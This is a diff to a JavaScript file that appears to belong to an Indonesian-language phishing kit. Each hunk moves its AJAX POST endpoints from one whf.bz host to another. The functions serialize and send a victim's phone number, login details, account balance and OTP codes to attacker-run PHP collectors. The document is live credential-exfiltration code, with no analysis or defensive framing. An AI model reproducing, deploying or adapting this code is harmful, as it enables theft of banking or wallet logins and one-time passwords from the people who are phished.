@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://chroedevsi.whf.bz/2h-ge12vt/no.php',
+      url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://chroedevsi.whf.bz/2h-ge12vt/sudah.php',
+      url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -62,7 +62,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://chroedevsi.whf.bz/2h-ge12vt/saldosdh.php',
+      url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -95,7 +95,7 @@ function sendOtpS() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/2h-ge12vt/otpsdh.php',
+        url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/otpsdh.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
@@ -128,7 +128,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/2h-ge12vt/belum.php',
+        url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/belum.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -161,7 +161,7 @@ function sendOtp() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/2h-ge12vt/otpblm.php',
+        url: 'https://kuda-terbang.whf.bz/notif/2h-ge12vt/otpblm.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
